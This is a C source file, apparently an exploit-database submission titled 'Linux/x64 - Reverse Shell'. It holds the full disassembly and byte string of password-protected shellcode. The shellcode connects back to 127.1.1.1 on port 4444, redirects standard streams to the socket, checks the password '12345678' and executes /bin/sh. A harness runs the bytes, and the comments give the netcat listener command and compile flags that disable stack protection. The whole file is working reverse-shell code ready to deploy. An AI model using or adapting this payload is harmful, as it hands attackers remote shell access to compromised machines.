/*
 Exploit Title: Linux/x64 - Reverse Shell 
 Author: Guillem Alminyana
 Date: 2021-01-18
 Platform: GNU Linux x64
 =====================================
 
 This shellcode connects back to 127.1.1.1 address on port 4444
 Listener needs to be opened before execute: nc -lvp 4444
 
 Compile: 
   gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

/*
   0:	6a 29                	push   0x29
   2:	58                   	pop    rax
   3:	6a 02                	push   0x2
   5:	5f                   	pop    rdi
   6:	6a 01                	push   0x1
   8:	5e                   	pop    rsi
   9:	99                   	cdq    
   a:	0f 05                	syscall 
   c:	50                   	push   rax
   d:	5f                   	pop    rdi
   e:	52                   	push   rdx
   f:	68 7f 01 01 01       	push   0x101017f
  14:	66 68 11 5c          	pushw  0x5c11
  18:	66 6a 02             	pushw  0x2
  1b:	6a 2a                	push   0x2a
  1d:	58                   	pop    rax
  1e:	54                   	push   rsp
  1f:	5e                   	pop    rsi
  20:	6a 10                	push   0x10
  22:	5a                   	pop    rdx
  23:	0f 05                	syscall 
  25:	6a 02                	push   0x2
  27:	5e                   	pop    rsi
  28:	6a 21                	push   0x21
  2a:	58                   	pop    rax
  2b:	0f 05                	syscall 
  2d:	48 ff ce             	dec    rsi
  30:	79 f6                	jns    28 <loop_1>
  32:	6a 01                	push   0x1
  34:	58                   	pop    rax
  35:	49 b9 50 61 73 73 77 	movabs r9,0x203a647773736150
  3c:	64 3a 20 
  3f:	41 51                	push   r9
  41:	54                   	push   rsp
  42:	5e                   	pop    rsi
  43:	6a 08                	push   0x8
  45:	5a                   	pop    rdx
  46:	0f 05                	syscall 
  48:	48 31 c0             	xor    rax,rax
  4b:	48 83 c6 08          	add    rsi,0x8
  4f:	0f 05                	syscall 
  51:	48 b8 31 32 33 34 35 	movabs rax,0x3837363534333231
  58:	36 37 38 
  5b:	56                   	push   rsi
  5c:	5f                   	pop    rdi
  5d:	48 af                	scas   rax,QWORD PTR es:[rdi]
  5f:	75 1a                	jne    7b <exit_program>
  61:	6a 3b                	push   0x3b
  63:	58                   	pop    rax
  64:	99                   	cdq    
  65:	52                   	push   rdx
  66:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  6d:	2f 73 68 
  70:	53                   	push   rbx
  71:	54                   	push   rsp
  72:	5f                   	pop    rdi
  73:	52                   	push   rdx
  74:	54                   	push   rsp
  75:	5a                   	pop    rdx
  76:	57                   	push   rdi
  77:	54                   	push   rsp
  78:	5e                   	pop    rsi
  79:	0f 05                	syscall 
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

void main()
{
	printf("ShellCode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}